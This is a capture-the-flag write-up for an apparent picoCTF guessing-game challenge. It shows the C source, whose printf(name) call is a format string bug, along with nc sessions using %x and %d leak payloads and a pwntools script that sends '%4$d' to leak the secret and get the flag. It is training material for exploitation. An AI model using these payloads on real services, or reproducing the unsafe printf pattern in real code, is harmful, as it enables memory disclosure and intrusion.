### S0lv3d by H4yicl3

try to download it !!
we can't donwload binary so we download source
```c
#include <stdio.h>
#include <stdlib.h>

char *flag = "~~FLAG~~";

void main(){
    int secret, guess;
    char name[32];
    long seed;

    FILE *f = fopen("/dev/urandom", "rb");
    fread(&secret, sizeof(int), 1, f);
    fclose(f);

    printf("Hello! What is your name?\n");
    fgets(name, sizeof(name), stdin);

    printf("Welcome to the guessing game, ");
    printf(name);			//<------ bug give us know the value of secret 
    printf("\nI generated a random 32-bit number.\nYou have a 1 in 2^32 chance of guessing it. Good luck.\n");

    printf("What is your guess?\n");
    scanf("%d", &guess);

    if(guess == secret){
        printf("Wow! You guessed it!\n");
        printf("Your flag is: %s\n", flag);
    }else{
        printf("Hah! I knew you wouldn't get it.\n");
    }
}
```

This is format string bug
```
nc vuln2014.picoctf.com 4546
Hello! What is your name?
%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_
Welcome to the guessing game, 20_f77c3c20_8368008_6d369c7_2f_8368008_255f7825_78255f78_5f78255f_255f7825_
I generated a random 32-bit number.
You have a 1 in 2^32 chance of guessing it. Good luck.
What is your guess?
Hah! I knew you wouldn't get it.
```
so i don't know where the value of secret pointed !!
so we know the address 32 bit is 0x8xxxxxx so i just choose the 
value difference

```
nc vuln2014.picoctf.com 4546
Hello! What is your name?
%d_%d_%d_%d_%d_%d_%d_%d
Welcome to the guessing game, 32_-142828512_164544520_-695731121_47_164544520_627008549_1680170852

I generated a random 32-bit number.
You have a 1 in 2^32 chance of guessing it. Good luck.
What is your guess?
-695731121
Wow! You guessed it!
Your flag is: leak_the_seakret
```
now we know the offset off secret is 4

```python
from pwn import *

host = "vuln2014.picoctf.com"
port = 4546

s = remote(host,port)
print s.recvuntil("\n")
s.sendline("%4$d")
print s.recvuntil("game, ")
guess = s.recvuntil("\n")
print guess
print s.recvuntil("?\n")
print s.sendline(guess)
print s.recvuntil("\n")
print s.recvuntil("\n")

s.close()
```

try to run it
```python
python guess.py 
[+] Opening connection to vuln2014.picoctf.com on port 4546: Done
Hello! What is your name?

Welcome to the guessing game, 
-1762068613


I generated a random 32-bit number.
You have a 1 in 2^32 chance of guessing it. Good luck.
What is your guess?

None
Wow! You guessed it!

Your flag is: leak_the_seakret

[*] Closed connection to vuln2014.picoctf.com port 4546
``

well done!`
